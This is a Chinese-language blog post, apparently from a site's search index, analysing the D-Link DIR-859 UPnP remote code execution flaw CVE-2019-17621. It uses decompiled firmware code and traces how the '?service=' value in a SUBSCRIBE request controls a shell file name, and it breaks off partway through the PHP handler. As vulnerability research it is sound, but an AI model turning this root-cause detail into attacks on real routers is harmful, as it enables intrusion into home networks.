<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>D-Link RCE CVE-2019-17621分析</title>
    <url>/2020/03/29/d-link-rce-cve-2019-17621-fen-xi/</url>
    <content><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><blockquote>
<p> The UPnP endpoint URL /gena.cgi in the D-Link DIR-859 Wi-Fi router 1.05 and 1.06B01 Beta01 allows an Unauthenticated remote attacker to execute system commands as root, by sending a specially crafted HTTP SUBSCRIBE request to the UPnP service when connecting to the local network. </p>
</blockquote>
<p>这是CVE官网对于CVE-2019-17621的描述，从描述中可以看出漏洞出现在处理UPnP订阅请求的代码中，漏洞目标是D-Link DIR-859路由器，固件版本为1.06b01 Beta01, 1.05，该漏洞是无需认证的远程代码执行漏洞（一般处于局域网中）。</p>
<p>根据研究人员Miguel Mendez Z.的介绍，该漏洞还影响以下产品：</p>
<p><img src="Affected_product.png" alt=""></p>
<h1 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h1><table>
<thead>
<tr>
<th></th>
<th>测试环境</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>操作系统</td>
<td>Ubuntu 16.04 LTS</td>
<td></td>
</tr>
<tr>
<td>系统仿真工具</td>
<td>Firmadyne</td>
<td></td>
</tr>
<tr>
<td>反编译工具</td>
<td>Ghidra</td>
<td></td>
</tr>
<tr>
<td>分析固件</td>
<td>DIR-859 1.05版本</td>
<td><a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-859/DIR-859_REVA_FIRMWARE_v1.05B03.zip">ftp://ftp2.dlink.com/PRODUCTS/DIR-859/DIR-859_REVA_FIRMWARE_v1.05B03.zip</a></td>
</tr>
</tbody></table>
<p>Firmadyne是一款自动化和可裁剪的嵌入式Linux系统固件分析框架，它支持系统固件逆向QEMU嵌入式系统模拟执行，使用其可模拟执行路由器固件，安装和使用方法详见<a href="https://github.com/firmadyne/firmadyne" target="_blank" rel="noopener">https://github.com/firmadyne/firmadyne</a>。之后的文章会可能会对该工具进一步介绍。</p>
<p>Ghidra是由美国国家安全局（NSA）研究部门开发的软件逆向工程（SRE）套件，用于支持网络安全任务。 Ghidra具有反编译功能，查看、定位反编译后的代码相较于IDA有优势。 针对MIPS架构代码的反编译功能较好。</p>
<h1 id="upnp"><a href="#upnp" class="headerlink" title="upnp"></a>upnp</h1><p>该漏洞设计upnp，那么简单了解下upnp协议。</p>
<p>随着越来越多的设备联入网络，对于共享设备以及共享设备提供的资源和服务的需求也越来越强烈，透明的访问各种联入网络的资源也成为了一种非常复杂的任务。因此，在1999年，Microsoft公司开始大张旗鼓地宣传下一代即插即用技术–通用即插即用（ Universal Plug and Play，简称UPnP）。UPnP实际上是扩展了传统单机的设备和计算机系统的概念，在”零配置”的前提下提供了连网设备之间的发现、接口声明和其他信息的交换等互动操作功能。Microsoft公司称”UPnP将延伸到家庭中的每一个设备，它会成为个人电脑、应用程序、智能设备集成工作所必需的框架、协议和接口标准”。</p>
<p>UPnP是实现智能设备端到端网络连接的结构。它也是一种架构在TCP/IP和HTTP技术之上的，分布式、开放的网络结构，以使得在联网的设备间传递控制和数据。UPnP 技术实现了 控制点、设备和 服务之间通讯的支持，并且设备和相关服务的也使用XML定义并且公布出来。使用UPnP，设备可以动态加入网络，自动获得一个IP地址，向其他设备公布它的能力或者获知其他设备的存在和服务，所有这些过程都是自动完成的，此后设备能够彼此直接通讯。 </p>
<p>UPnP不需要设备驱动程序，因此使用UPnP建立的网络是介质无关的。同时UPnP使用标准的TCP/IP和网络协议，使它能够无缝的融入现有网络。构造UPnP应用程序时可以使用任何语言，并在任何操作系统平台上编译运行。对于设备的描述，使用HTML表单表述设备控制界面。它既允许设备供应商提供基于浏览器的用户界面和编程控制接口，也允许开发人员定制自己的设备界面。 </p>
<p>由于该漏洞主要涉及到upnp订阅请求处理函数，订阅事件定义在gena协议中，下面介绍下upnp网络中的设备事件。</p>
<h2 id="设备事件"><a href="#设备事件" class="headerlink" title="设备事件"></a>设备事件</h2><p>设备事件是UPnP网络的第四步。一个服务的UPnP描述包括服务响应的动作列表和运行时模拟服务状态的变量列表。当这些变量改变时，服务就会发布更新，则控制点就会收到设备事件。设备事件发送的一般过程如下图： </p>
<p><img src="event.png" alt=""></p>
<p>为了订阅事件，订阅者发送一个订阅消息。如果出版者收到此消息，它将以这个订阅的持续时间作为响应。为了保持订阅，订阅者必须在订阅到期之前进行续订。在订阅者不需要出版者发送的事件时，订阅者必须取消这个订阅。出版者通过发送事件消息提醒订阅者状态变量改变。事件消息包含多个状态变量的名字和这些变量的当前值。在订阅者第一次订阅时，需要发送初始化事件消息，这个事件包含所有事件变量的名和值并且允许订阅者出示化服务变量值。为了支持多个控制点，在动作生效之后所有订阅者都将接到通知。事件消息使用HTTP协议传送，事件详细定义在通用事件通知结构（General Event Notification Architecture）协议中。 </p>
<p>关于upnp的具体实现细节不在这里叙述啦。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>利用binwalk能够直接解压固件，先在文件系统中查找是否有gena.cgi的文件</p>
<p><code>find . -name "gena.cgi"</code></p>
<p>或包含gena.cgi的文件</p>
<p><code>grep -nr "gena.cgi" .</code></p>
<p><img src="grep_gena.cgi.png" alt=""></p>
<p>定位到/htdocs/cgibin，利用Ghidra直接反编译，其中<code>main()</code>函数比较最后一个’/‘之后的参数是否等于gena.cgi。</p>
<p><img src="main().png" alt=""></p>
<p>之后跳转到<code>genacgi_main()</code>函数.</p>
<p><img src="genacgi_main.png" alt=""></p>
<p>该函数在处理UPnP订阅请求过程中，存在远程执行代码漏洞，Ghidra反编译得到<code>genacgi_main()</code>的伪码。（为了方便阅读，对变量进行更名）</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">genacgi_main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  request_method <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"REQUEST_METHOD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>request_method <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  request_uri <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"REQUEST_URI"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  request_uri_0x3f <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>request_uri<span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>request_uri_0x3f <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  cmp_service <span class="token operator">=</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>request_uri_0x3f<span class="token punctuation">,</span><span class="token string">"?service="</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  cmp_service <span class="token operator">=</span> <span class="token function">strcasecmp</span><span class="token punctuation">(</span>request_method<span class="token punctuation">,</span><span class="token string">"SUBSCRIBE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  request_uri_0x3f <span class="token operator">=</span> request_uri_0x3f <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">;</span>
  <span class="token comment" spellcheck="true">/* 如果不是SUBSCRIBE */</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     cmp_service <span class="token operator">=</span> <span class="token function">strcasecmp</span><span class="token punctuation">(</span>request_method<span class="token punctuation">,</span><span class="token string">"UNSUBSCRIBE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  <span class="token punctuation">}</span>
  request_method <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"SERVER_ID"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  http_sid <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_SID"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  http_callback <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_CALLBACK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  http_timeout <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_TIMEOUT"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  http_nt <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_NT"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  remote_addr <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>http_sid <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     cmp_service <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>http_nt<span class="token punctuation">,</span><span class="token string">"upnp:event"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     request_uri <span class="token operator">=</span> <span class="token number">0x19c</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>cmp_service <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>http_callback <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       cmp_service <span class="token operator">=</span> <span class="token function">strcasecmp</span><span class="token punctuation">(</span>http_timeout<span class="token punctuation">,</span><span class="token string">"Second-infinite"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       real_timeout <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          cmp_service <span class="token operator">=</span> <span class="token function">strncasecmp</span><span class="token punctuation">(</span>http_timeout<span class="token punctuation">,</span><span class="token string">"Second-"</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          request_uri <span class="token operator">=</span> <span class="token number">400</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> LAB_004103d8<span class="token punctuation">;</span>
          real_timeout <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>http_timeout <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
       sVar1 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>http_callback<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span>http_callback<span class="token punctuation">[</span>sVar1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'>'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          http_callback<span class="token punctuation">[</span>sVar1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
       http_callback <span class="token operator">=</span> http_callback <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">*</span>http_callback <span class="token operator">==</span> <span class="token string">'&lt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       cmp_service <span class="token operator">=</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>http_callback<span class="token punctuation">,</span><span class="token string">"http://"</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       request_uri <span class="token operator">=</span> <span class="token number">0x19c</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          http_sid <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>http_callback <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>http_sid <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token operator">*</span>http_sid <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
            pid <span class="token operator">=</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">/* 漏洞点 */</span>
            <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>
                       <span class="token string">"%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh"</span>
                       <span class="token punctuation">,</span><span class="token string">"/htdocs/upnp/run.NOTIFY.php"</span><span class="token punctuation">,</span>request_method<span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>http_callback <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">,</span>
                       http_sid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>real_timeout<span class="token punctuation">,</span>remote_addr<span class="token punctuation">,</span><span class="token string">"/var/run"</span><span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">/* 处理buf */</span>
            <span class="token function">xmldbc_ephp</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            pid <span class="token operator">=</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token string">"NOTIFY:0:sh %s/%s_%d.sh"</span><span class="token punctuation">,</span><span class="token string">"/var/run"</span><span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">xmldbc_timer</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          request_uri <span class="token operator">=</span> <span class="token number">0x19c</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<p><code>genacgi_main()</code>首先进行一系列判断和取值，其中包括判断<code>REQUEST_METHOD</code>是否为<code>SUBSCRIBE</code>，只有当请求方式为<code>SUBSCRIBE</code>才能触发漏洞，还判断了<code>REQUEST_URI</code>中是否有<code>?service=</code>参数，并将<code>?service=</code>之后的值赋给变量<code>request_uri_0x3f</code>，通过<code>getpid()</code>获得当前的<code>pid()</code>。</p>
<pre class=" language-c"><code class="language-c"><span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>
                       <span class="token string">"%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh"</span>
                       <span class="token punctuation">,</span><span class="token string">"/htdocs/upnp/run.NOTIFY.php"</span><span class="token punctuation">,</span>request_method<span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>http_callback <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">,</span>
                       http_sid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>real_timeout<span class="token punctuation">,</span>remote_addr<span class="token punctuation">,</span><span class="token string">"/var/run"</span><span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>漏洞点位于<code>sprintf()</code>中，<code>sprintf()</code>设置了一个缓冲区buf，将之前取得一些列的值都放到缓冲区buf中，其中我们需要关注的是<code>SHELL_FILE=%s/%s_%d.sh</code>。经过sprintf()之后，缓冲区中有<code>SHELL_FILE=/var/run/request_uri_0x3f_pid.sh</code>，其中<code>request_uri_0x3f</code>上面提到是<code>?service=</code>之后的值。</p>
<p>也就是说如果我们构造如下结构的数据包将可以控制缓冲区中<code>SHELL_FILE</code>的值。</p>
<pre class=" language-php"><code class="language-php"><span class="token constant">REQUEST_METHOD</span> <span class="token operator">=</span> <span class="token constant">SUBSCRIBE</span>
<span class="token constant">REQUEST_URI</span> <span class="token operator">=</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//IP:PORT/*?service=file_name"</span>
request_uri_0x3f <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>request_uri<span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 0x3f = </span><span class="token string">'?'</span>
request_uri_0x3f <span class="token operator">=</span> request_uri_0x3f <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token shell-comment comment">#此时request_uri_0x3f = file_name</span></code></pre>
<p>之后缓冲区的buf被<code>xmldbc_ephp()</code>处理。<code>xmldbc_ephp()</code>函数的第三个参数为buf，进入该函数。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">xmldbc_ephp</span><span class="token punctuation">(</span>undefined4 param_1<span class="token punctuation">,</span>undefined4 param_2<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span>undefined4 param_4<span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  size_t <span class="token function">lenof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  undefined <span class="token operator">*</span>local_20<span class="token punctuation">;</span>

  local_20 <span class="token operator">=</span> <span class="token operator">&amp;</span>_gp<span class="token punctuation">;</span>
  <span class="token function">lenof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">FUN_0041420c</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span>param_2<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token function">lenof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>param_4<span class="token punctuation">,</span>local_20<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>发现获取了buf的长度之后，<code>FUN_0041420c()</code>处理了buf（第四个参数），继续进入该函数。</p>
<pre class=" language-c"><code class="language-c">undefined4
<span class="token function">FUN_0041420c</span><span class="token punctuation">(</span>undefined4 param_1<span class="token punctuation">,</span>uint param_2<span class="token punctuation">,</span>undefined4 param_3<span class="token punctuation">,</span>undefined4 buf<span class="token punctuation">,</span>ushort param_5<span class="token punctuation">,</span>
               <span class="token keyword">int</span> param_6<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> __fd<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  undefined4 uVar2<span class="token punctuation">;</span>

  __fd <span class="token operator">=</span> <span class="token function">FUN_0041372c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/* 创建socket */</span>
  uVar2 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&lt;</span> __fd<span class="token punctuation">)</span> <span class="token punctuation">{</span>
     iVar1 <span class="token operator">=</span> <span class="token function">FUN_00413810</span><span class="token punctuation">(</span>__fd<span class="token punctuation">,</span>param_2 <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">,</span>param_3<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>param_5<span class="token punctuation">)</span><span class="token punctuation">;</span>
     uVar2 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<p>首先<code>FUN_0041372c()</code>创建socket</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">FUN_0041372c</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>param_1<span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  <span class="token keyword">int</span> __fd<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>
  sockaddr local_80 <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  __fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>__fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     iVar2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
     <span class="token function">fcntl</span><span class="token punctuation">(</span>__fd<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span>param_1 <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       param_1 <span class="token operator">=</span> <span class="token string">"/var/run/xmldb_sock"</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
     local_80<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sa_family <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
     <span class="token function">snprintf</span><span class="token punctuation">(</span>local_80<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sa_data<span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">,</span><span class="token string">"%s"</span><span class="token punctuation">,</span>param_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
     iVar1 <span class="token operator">=</span> <span class="token function">connect</span><span class="token punctuation">(</span>__fd<span class="token punctuation">,</span>local_80<span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     iVar2 <span class="token operator">=</span> __fd<span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       iVar2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
       <span class="token function">close</span><span class="token punctuation">(</span>__fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> iVar2<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>之后当_fd &gt; -1时，buf被传入FUN_00413810()中，作为第四个参数，进入该函数。</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">FUN_00413810</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">,</span>undefined2 param_2<span class="token punctuation">,</span>undefined4 param_3<span class="token punctuation">,</span><span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span>ushort param_5<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  sVar1 <span class="token operator">=</span> <span class="token function">send</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span><span class="token operator">&amp;</span>local_20<span class="token punctuation">,</span><span class="token number">0xc</span><span class="token punctuation">,</span><span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  uVar2 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;</span> sVar1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
     sVar1 <span class="token operator">=</span> <span class="token function">send</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>param_5<span class="token punctuation">,</span><span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     uVar2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span>sVar1 <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       uVar2 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> uVar2<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>发现我们的buf被send给创建好的socket。其实是发送给了php脚本进行处理。</p>
<p>至此整个流程为：buf -&gt; <code>xmldbc_ephp()</code> -&gt; <code>FUN_0041420c()</code> -&gt; <code>FUN_00413810()</code> -&gt; socket。经过xmldbc_ephp()处理后，由buf中的参数<code>/htdocs/upnp/run.NOTIFY.php</code>这个php文件进行处理。</p>
<p>run.NOTIFY.php内容为：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span>
<span class="token keyword">include</span> <span class="token string">"/htdocs/phplib/upnp/xnode.php"</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string">"/htdocs/upnpinc/gvar.php"</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string">"/htdocs/upnpinc/gena.php"</span><span class="token punctuation">;</span>

<span class="token variable">$gena_path</span> <span class="token operator">=</span> <span class="token function">XNODE_getpathbytarget</span><span class="token punctuation">(</span><span class="token variable">$G_GENA_NODEBASE</span><span class="token punctuation">,</span> <span class="token string">"inf"</span><span class="token punctuation">,</span> <span class="token string">"uid"</span><span class="token punctuation">,</span> <span class="token variable">$INF_UID</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$gena_path</span> <span class="token operator">=</span> <span class="token variable">$gena_path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$SERVICE</span><span class="token punctuation">;</span>
<span class="token function">GENA_subscribe_cleanup</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

